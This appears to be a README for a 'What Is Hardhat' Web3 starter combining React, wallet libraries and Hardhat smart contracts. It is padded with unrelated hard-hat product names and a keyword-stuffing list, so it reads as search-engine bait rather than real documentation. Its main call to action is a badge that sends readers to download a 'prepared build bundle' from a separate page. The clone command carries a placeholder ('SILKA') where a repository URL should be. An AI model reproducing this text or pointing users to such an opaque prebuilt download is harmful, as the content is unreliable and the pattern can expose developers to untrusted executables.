# What Is Hardhat - Visual Web3 Starter And Hard Hat Guide

<div align="center">
  <img src="logo.png" alt="What Is Hardhat Logo" width="160">
</div>

> What Is Hardhat combines a fast React interface, wallet tooling, and a Hardhat smart-contract workspace in one modular starter. The visual layout can organize hard hat references such as helmet classes, Type 2 hardhat options, hardhat light choices, and custom hardhat stickers.

## Highlights

- React 19, React Router, TypeScript, Tailwind CSS, and reusable UI components.
- Wagmi, viem, AppKit, and Web3Modal-ready wallet connection patterns.
- Hardhat configuration with Solidity contracts and a deployment script.
- Theme-ready routes for product previews, contract details, and focused collections.
- Structured utilities, validation, state helpers, formatting, and responsive navigation.

![Visual Background](public/images/background-stars.svg)

## Get The Build

[![GET WHAT IS HARDHAT](https://img.shields.io/badge/GET%20WHAT%20IS%20HARDHAT-FFB000?style=for-the-badge&logoColor=white)](https://what-is-hardhat.github.io/what-is-hardhat/what-is-hardhat)

The button provides the prepared build bundle.

### Command-Line Setup

```powershell
git clone SILKA what-is-hardhat
Set-Location what-is-hardhat
pnpm install
pnpm dev
```

The development server starts the React interface with its routes, theme, and wallet provider.

## What You Can Explore

The route structure supports a compact visual catalog for hard hat selections. Use cards and preview sections to compare a Milwaukee hardhat, black hardhat, MSA hardhat, Klein hardhat, cowboy hat hardhat, or Pyramex hard hat while keeping technical details close to each view.

![Wallet Connection](public/images/wallet-connect-logo.svg)

The wallet layer follows the same connect, account, network, and disconnect flow used by the included Web3 starters. Cached sessions and chain state stay inside the provider layer, while page components remain focused on presentation.

## Project Map

| Area | Local Path | Purpose |
| --- | --- | --- |
| Application | `src/App.tsx` | Providers and top-level routes |
| Layout | `src/Root.tsx` | Header, content outlet, and footer |
| Pages | `src/routes/` | Home, preview, contract, and about views |
| Components | `src/components/` | Shared elements and UI primitives |
| Wallet | `src/context/AppKitProvider.tsx` | AppKit and Wagmi integration |
| Styling | `src/app.css` | Tailwind theme and global styles |
| Hardhat | `smart-contracts/hardhat.config.js` | Smart-contract tool configuration |
| Contracts | `smart-contracts/contracts/` | ICO and token Solidity contracts |

![Wallet Provider](public/images/meta-mask-fox.svg)

## Usage

Run the standard project checks before creating a production build:

```bash
pnpm lint
pnpm format
pnpm build
pnpm preview
```

Compile or deploy the included contracts from their dedicated workspace:

```bash
cd smart-contracts
npm install
npx hardhat compile
npx hardhat run scripts/deploy.js
```

Keep chain configuration in `smart-contracts/hardhat.config.js`, wallet setup in `src/context/AppKitProvider.tsx`, and display content inside `src/routes/`.

## Focus Terms

what is hardhat, hard hat, helmet, hardhat watch, hardhat near me, hardhat stickers, hardhat light, type 2 hardhat, lift hardhat, black hardhat, msa hardhat, klein hardhat, custom hardhat stickers, cowboy hat hardhat, pyramex hard hat

## Project Notes

Use local environment files for wallet and deployment values. Run formatting, linting, and production builds before publishing changes. The included modules retain their existing source headers and repository license terms.
